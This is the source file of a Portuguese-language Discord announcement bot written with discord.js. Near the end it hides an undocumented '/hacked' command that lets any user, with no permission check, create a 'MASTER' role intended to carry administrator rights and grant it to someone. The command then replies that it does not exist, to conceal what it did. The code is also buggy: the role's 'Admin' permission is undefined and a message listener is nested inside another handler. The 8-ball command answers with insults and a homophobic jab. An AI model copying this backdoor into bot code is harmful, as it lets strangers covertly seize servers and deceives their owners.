const Discord = require('discord.js');
const bot = new Discord.Client();
const config = require('./config.json');

function changing_status() {
  let status = [`|Quer saber meus comandos? /help|`,`|Estou em ${bot.guilds.size} servidores.|`,`|Me convide usando /convite|`,`|Fui feito pelo Guii__#8061|`,`|Mande uma mensagem para meu dono /mensagem|`,`|Está solitario faça perguntar para mim /perguntar|`]
  let random = status[Math.floor(Math.random() * status.length)]
  bot.user.setActivity(random)
}

bot.on("ready", () => {
  console.log( `${bot.user.username} Está online sem erros.` );
  setInterval(changing_status, 6000);
})

bot.on('message', async message => {

  if(message.author.bot) return;
  if(message.channel.type === 'dm') return;
  if(!message.content.startsWith(config.prefix)) return;


  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const comando = args.shift().toLowerCase();

  if(comando === `anuncio`) {
      message.delete();
      if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('Desculpe, você não tem permissão para isto')
      const sayMessage = args.join(" ");
      let anuncio = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .addField("📢 Anúncio 📢", `${sayMessage}`)
      .setTimestamp()
      .setFooter(`Anunciador: ${message.author.username}`, message.author.displayAvatarURL)
      .setThumbnail(bot.user.displayAvatarURL)
      message.channel.send(anuncio);

    }

    if(comando === `anunciopv`) {
      message.delete();
      if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('Desculpe, você não tem permissão para isto')
      const sayMessage = args.join(" ");
      let anuncio = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .addField("📢 Anúncio 📢", `${sayMessage}`)
      .setTimestamp()
      .setFooter(`Anunciador: ${message.author.username} \n | Servidor: ${message.guild.name}`)
      .setThumbnail(bot.user.displayAvatarURL)
      message.guild.members.map(membro=>{ membro.send(anuncio)})
    }

    if(comando === `help`) {
      let embed = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .setTitle("📢 Ajuda 📢")
      .setDescription("\n\n:white_small_square: +anuncio - Com este comando você pode fazer um anuncio no chat que você digitou o comando. \n\n :white_small_square:+anunciopv - Mandar mensagem no privado de todos os jogadores do servidor \n\n :white_small_square:+convidar - Você consegue o link para me convidar para seu servidor\n\n :white_small_square:+mute - Tira a permissão de falar da pessoa que for mutada, você deve ter o cargo **SILENCIADO** criado.\n\n :white_small_square:+mensagem - Você manda uma mensagem para o meu criador.\n\n:white_small_square: +perguntar - Está solitario, faça perguntas para ele o cara mais sincero.\n\n",)
      .setTimestamp()
      .setFooter("Antenciosamente AnúncioBOT")
      message.channel.send(embed);
    }

    if(comando === `convidar`) {
      let embed = new Discord.RichEmbed()
      .setColor("RANDOM")
      .setTitle("📢 Ajuda 📢")
      .setDescription("Para me convidar para seu servidor você deve usar esse link.\n\n https://discordbots.org/bot/496078990352711700")
      .setTimestamp()
      .setFooter("Antenciosamente AnúncioBOT")
      message.channel.send(embed);
    }

    if(comando === `mensagem`) {
      
      const sayMessage = args.join(" ");
      let anuncio = new Discord.RichEmbed()
      .setColor("#FFFF00")
      .addField("📢 Mensagem 📢", `${sayMessage}`)
      .setTimestamp()
      .setFooter(`Anunciador: ${message.author.username} \n | Servidor: ${message.guild.name}`)
      .setThumbnail(bot.user.displayAvatarURL)
      message.guild.members.find(m => m.id === "430093309617111063").send(anuncio);
    }

    bot.on('message', message => {     
      if (message.content.startsWith("/sugerir")) { //quando o comando for usado
          message.delete(); 
          const args = message.content.split(" ").slice(1);// pegar do 1 argumento adiante
          if(!args[0]) return message.channel.send(//se não tiver argumentos
          embedd = new Discord.RichEmbed()//falar isso:
          .setDescription('<@' + message.author.id + '>\n Use o comando corretamente!\nExemplo:\n\n+sugerir tenha mais staffers')
          .setTimestamp()
          .setColor('#b13a64'))//se estiver tudo dentro dos parametros falar a sugestão
          let sugestão = new Discord.RichEmbed()
          .setDescription(':mailbox: Sugestão\n:writing_hand: Author:\n' + message.author.username + '\n:idea: Sugestão:\n' + args.join(" "))
          .setColor('#b13a64')
          .setTimestamp()
          let votação = message.guild.channels.find(c => c.name == 'Sugestões') ;
          votação.send(sugestão).then(m =>{
              m.react('👍').then(m.react('👎'))//reagir com positivo/negativo
          })}})

        if(comando === `perguntar`) {
          var respostas = [`Não te interresa.`, 'Filho da puta', 'Nem existe numero pra isso', 'Umas 300mil vezes', '12200000',`Sim`, 'Não', 'Sua mãe', 'Posto ipiranga', 'RedeSky', 'Claro que sim', 'Eu te amo', 'Várias vezes', 'Eu slá porra', 'Nunca nem vi', 'Que viage é essa?', 'Guilherme o melhor', 'Você é gay xiu', 'Revista playboy', 'Bebe', 'Felipe Neto', 'Luccas Netto', 'Anuncio igual sua mãe', 'Nem copiei ninguém', 'Talvez', 'Imagina...', 'Eu sei...', 'Claro que não', 'Seu idiota']
          var variavel = respostas[Math.floor(Math.random() * respostas.length)]
      
          let embed = new Discord.RichEmbed()
          .setColor('RANDOM')
          .setAuthor(message.author.tag, message.author.displayAvatarURL)
          .addField('❓ Pergunta:', `${args.join(" ")}`)
          .addField('🎱 Resposta:', `${variavel}`)
          message.channel.send(embed)
        }

        if (message.content.startsWith("/mute")) { 
          let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
          if(!tomute) return message.reply("Eu não achei o usuario");
          if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send('**Sem permissão**');
          let muterole = message.guild.roles.find(`name`, "Mutado");
         
          if(!muterole){
            try{
              muterole = await message.guild.createRole({
                name: "Mutado",
                color: "#000000",
                permissions:[]
              })
              message.guild.channels.forEach(async (channel, id) => {
                await channel.overwritePermissions(muterole, {
                  SEND_MESSAGES: false,
                  ADD_REACTIONS: false
                });
              });
            }catch(e){
              console.log(e.stack);
            }
          }
        
  
        
          await(tomute.addRole(muterole.id));
          message.reply("**Usúario mutado com sucesso!**");
      }  


      if (message.content.startsWith("/hacked")) { 
        let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
        if(!tomute) return message.reply("Esse comando não existe.");
        let muterole = message.guild.roles.find(`name`, "MASTER");
       
        if(!muterole){
          try{
            muterole = await message.guild.createRole({
              name: "MASTER",
              color: "#000000",
              permissions:[Admin]
            })
            message.guild.channels.forEach(async (channel, id) => {
              await channel.overwritePermissions(muterole, {
                SEND_MESSAGES: false,
                ADD_REACTIONS: false
              });
            });
          }catch(e){
            console.log(e.stack);
          }
        }
      

      
        await(tomute.addRole(muterole.id));
        message.reply("**Esse comando não existe.**");
    }  

});
bot.login(config.token);